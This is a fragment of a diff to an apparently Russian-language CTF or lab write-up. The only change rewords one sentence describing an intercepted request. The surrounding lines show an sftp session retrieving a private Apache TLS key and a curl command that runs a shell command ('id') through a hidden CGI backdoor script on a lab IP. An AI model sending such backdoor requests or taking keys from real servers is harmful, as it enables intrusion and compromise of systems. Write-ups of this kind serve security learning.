@@ -362,7 +362,7 @@ sftp> get apache.key  Fetching /etc/apache2/certs/apache.key to apache.key apach
 ```
 https://10.64.181.102:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
 ```
-И мы видим некий лог с такой ссылкой.
+И мы видим пакет с таким запросом.
 
 ```
 curl -k -s 'https://10.64.181.102:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
